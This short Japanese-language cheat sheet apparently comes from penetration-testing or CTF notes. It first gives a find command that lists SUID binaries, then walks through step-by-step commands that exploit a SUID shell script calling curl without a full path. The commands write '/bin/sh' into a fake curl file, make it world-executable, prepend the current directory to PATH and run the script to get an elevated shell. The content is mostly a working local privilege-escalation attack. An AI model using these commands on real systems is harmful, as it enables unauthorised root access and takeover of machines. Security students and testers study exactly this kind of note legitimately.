### SUIDの探索
``` find / -perm -u=s -type f 2>/dev/null ```

### フルパスでないコマンドが入っているSUIDなシェルスクリプトから権限昇格する
例えば以下のようなコマンドを実行するシェルスクリプト(/usr/bin/menu)があったとする
```curl -I localhost```

1."/bin/sh"という文字列をcurlというファイルに出力する
2.生成されたcurlファイルに対してchmodで777にしてあげる
3.環境パスを現在のディレクトリにする
4.脆弱性のあるシェルスクリプトを実行すると権限昇格

以下が権限昇格の具体的な手順
```
echo /bin/sh > curl
chmod 777 curl
export PATH=現在のディレクトリ:$PATH
/usr/bin/menu
```